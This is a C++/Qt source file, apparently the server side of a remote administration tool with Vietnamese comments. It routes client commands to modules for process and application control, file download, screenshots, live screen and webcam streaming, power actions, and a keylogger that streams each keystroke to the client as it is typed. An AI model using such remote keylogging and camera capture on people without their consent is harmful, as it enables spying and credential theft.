#include "CommandManager.h"

#include <QDebug>

CommandManager::CommandManager(QObject *parent)
    : QObject(parent)
{
    appModule = new ApplicationModule(this);
    processModule = new ProcessModule(this);
    screenshotModule = new ScreenshotModule(this);
    keyloggerModule = new KeyloggerModule(this);
    fileModule = new FileModule(this);
    webcamModule = new WebcamModule(this);
    powerModule = new PowerModule(this);

    //---------------------------------------------------
    // Kết nối signals cho live screen
    //---------------------------------------------------

    connect(screenshotModule,
            &ScreenshotModule::frameCaptured,
            this,
            [this](const QString& base64Data)
    {
        Packet response(Protocol::START_LIVE_SCREEN, base64Data);
        emit responseReady(response);
    });

    //---------------------------------------------------
    // Kết nối signals cho webcam stream
    //---------------------------------------------------

    connect(webcamModule,
            &WebcamModule::frameCaptured,
            this,
            [this](const QString& base64Data)
    {
        Packet response(Protocol::START_WEBCAM_STREAM, base64Data);
        emit responseReady(response);
    });

    //---------------------------------------------------
    // Kết nối signals cho keylogger real-time
    // Mỗi khi có ký tự mới → gửi ngay cho Client
    //---------------------------------------------------

    connect(keyloggerModule,
            &KeyloggerModule::keyTextCaptured,
            this,
            [this](const QString& text)
    {
        Packet response(Protocol::GET_KEYLOGGER_DATA, text);
        emit responseReady(response);
    });
}

CommandManager::~CommandManager()
{
}


//---------------------------------------------------
// Xử lý command nhận được từ Client
//---------------------------------------------------

void CommandManager::handleCommand(const Packet& packet)
{
    QString command = packet.getCommand();
    QString data = packet.getData();

    qDebug() << "=== Handling command:" << command
             << "| Data:" << (data.length() > 50 ? data.left(50) + "..." : data);

    Packet response;
    response.setCommand(command);

    //=========================================
    // Application Commands
    //=========================================

    if (command == Protocol::LIST_APPLICATION)
    {
        QString result = appModule->listApplications();
        response.setData(result);
    }
    else if (command == Protocol::OPEN_APPLICATION)
    {
        QString result = appModule->openApplication(data);
        response.setData(result);
    }
    else if (command == Protocol::CLOSE_APPLICATION)
    {
        QString result = appModule->closeApplication(data);
        response.setData(result);
    }

    //=========================================
    // Process Commands
    //=========================================

    else if (command == Protocol::LIST_PROCESS)
    {
        QString result = processModule->listProcesses();
        response.setData(result);
    }
    else if (command == Protocol::KILL_PROCESS)
    {
        QString result = processModule->killProcess(data);
        response.setData(result);
    }
    else if (command == Protocol::START_PROCESS)
    {
        QString result = processModule->startProcess(data);
        response.setData(result);
    }

    //=========================================
    // Screenshot Commands
    //=========================================

    else if (command == Protocol::SCREENSHOT)
    {
        QString result = screenshotModule->captureScreen();
        response.setData(result);
    }
    else if (command == Protocol::START_LIVE_SCREEN)
    {
        screenshotModule->startLiveScreen();
        response.setData("SUCCESS");
    }
    else if (command == Protocol::STOP_LIVE_SCREEN)
    {
        screenshotModule->stopLiveScreen();
        response.setData("SUCCESS");
    }

    //=========================================
    // Keylogger Commands
    //=========================================

    else if (command == Protocol::START_KEYLOGGER)
    {
        QString result = keyloggerModule->startKeylogger();
        response.setData(result);
    }
    else if (command == Protocol::STOP_KEYLOGGER)
    {
        QString result = keyloggerModule->stopKeylogger();
        response.setData(result);
    }
    else if (command == Protocol::GET_KEYLOGGER_DATA)
    {
        QString result = keyloggerModule->getKeyloggerData();
        response.setData(result);
    }

    //=========================================
    // File Commands
    //=========================================

    else if (command == Protocol::LIST_FILES)
    {
        QString result = fileModule->listFiles(data);
        response.setData(result);
    }
    else if (command == Protocol::DOWNLOAD_FILE)
    {
        QString result = fileModule->downloadFile(data);
        response.setData(result);
    }

    //=========================================
    // Webcam Commands
    //=========================================

    else if (command == Protocol::CAPTURE_WEBCAM)
    {
        QString result = webcamModule->captureWebcam();
        response.setData(result);
    }
    else if (command == Protocol::START_WEBCAM_STREAM)
    {
        webcamModule->startStream();
        response.setData("SUCCESS");
    }
    else if (command == Protocol::STOP_WEBCAM_STREAM)
    {
        webcamModule->stopStream();
        response.setData("SUCCESS");
    }

    //=========================================
    // Power Commands
    //=========================================

    else if (command == Protocol::SHUTDOWN)
    {
        response.setData("SUCCESS");
        emit responseReady(response);
        powerModule->shutdown();
        return;
    }
    else if (command == Protocol::RESTART)
    {
        response.setData("SUCCESS");
        emit responseReady(response);
        powerModule->restart();
        return;
    }
    else if (command == Protocol::SLEEP)
    {
        response.setData("SUCCESS");
        emit responseReady(response);
        powerModule->sleep();
        return;
    }
    else if (command == Protocol::LOG_OFF)
    {
        response.setData("SUCCESS");
        emit responseReady(response);
        powerModule->logoff();
        return;
    }

    //=========================================
    // Unknown Command
    //=========================================

    else
    {
        qDebug() << "Unknown command:" << command;
        response.setCommand(Protocol::ERROR);
        response.setData("Unknown command: " + command);
    }

    emit responseReady(response);
}
